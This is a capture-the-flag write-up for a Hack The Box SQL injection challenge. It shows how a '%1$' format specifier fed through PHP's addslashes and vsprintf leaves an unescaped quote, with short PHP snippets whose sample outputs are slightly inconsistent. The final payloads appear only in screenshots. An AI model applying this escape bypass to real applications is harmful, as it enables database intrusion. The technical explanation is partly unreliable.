---
title: Baby sql - Hack The Box
excerpt: "Baby is a medium machine, your challenge is the escape caracter, from the php functions, where you need to test, to see what is valid. And try the sql command that are valids from database."
last_modified_at: 29-12-2021
categories:
  - writeups
tags:  
  - htb
  - sql_injection
  - escape_character
  - POST
---

![center-aligned-image](/assets/images/ctf/htb-writeup-baby-interdimensional-internet/synack.png){: .align-center}  

Baby is a medium machine, your challenge is the escape caracter, from the php functions, where you need to test, to see what is valid. And try the sql command that are valids from database.

## Web Page

Initialy we see a web page where has a php code, and a sql command, that receive a post parameter.

![](/assets/images/ctf/htb-writeup-baby-sql/1.png)

Now we can try a sql injection.  
But first we have to know what those functions in php code does.  
**addslashes**: https://www.php.net/manual/en/function.addslashes.php
**vsprintf**: https://www.php.net/manual/en/function.vsprintf.php  

The addslashe, basically add a slash to scape in a string, so will does this: 
```php
$pass = addslashes("passs'")
echo $pass
# result = pass\'
```
The vsprintf will format a string:
```php
$pass = addslashes("passs'")
echo $pass
# result = pass\'
vsprintf("SELECT * FROM users WHERE password=('$pass') AND username=('%s')", 'admin')
# result = SELECT * FROM users WHERE password=('pass\'') AND username=('%s')", 'admin')
```
But if use the %1$ the / will be retired. The 1 reference the \, add was added by addslashes, but the \ is a invalid reference, so is removed.
```php
$pass = addslashes("pass%1$'")
echo $pass
# result = pass%1$\'
vsprintf("SELECT * FROM users WHERE password=('$pass') AND username=('%s')", 'admin')
# result = SELECT * FROM users WHERE password=('pass'') AND username=('%s')", 'admin')
```

No we can do the sql injection.

![](/assets/images/ctf/htb-writeup-baby-sql/2.png)

Now the table is know.

![](/assets/images/ctf/htb-writeup-baby-sql/3.png)
